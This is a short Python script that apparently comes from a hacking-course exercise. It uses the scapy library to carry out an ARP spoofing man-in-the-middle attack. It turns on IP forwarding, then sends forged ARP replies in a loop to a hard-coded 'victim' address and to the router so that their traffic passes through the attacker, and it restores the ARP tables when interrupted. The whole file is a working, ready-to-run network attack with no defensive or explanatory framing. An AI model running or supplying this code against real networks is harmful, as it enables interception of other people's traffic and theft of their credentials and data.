import scapy.all as scapy
import time
import subprocess


def enable_port_forwarding():
    """
    Enables port forwarding on the machine by writing '1' to /proc/sys/net/ipv4/ip_forward.
    """
    try:
        subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
        print("[INFO] Port forwarding has been enabled.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to enable port forwarding: {e}")
        raise


def restore(destination_ip, source_ip):
    """
    Restores the ARP tables for the given destination and source IPs.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def spoof(target_ip, spoof_ip):
    """
    Sends ARP packets to spoof the target into thinking the attacker is the source.
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    """
    Gets the MAC address of the specified IP by sending an ARP request.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc


# Victim and router IPs
victim_ip = "172.16.149.163"
router_ip = "172.16.149.2"

# Enable port forwarding before starting
enable_port_forwarding()

# Spoofing loop
sent_packet_counter = 0
try:
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        sent_packet_counter += 2
        print(f"\r[+] Packets sent: {sent_packet_counter}", end="", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    # Restore ARP tables on interruption
    restore(victim_ip, router_ip)
    restore(router_ip, victim_ip)
    print("\n[+] Detected CTRL + C, restoring ARP tables.")
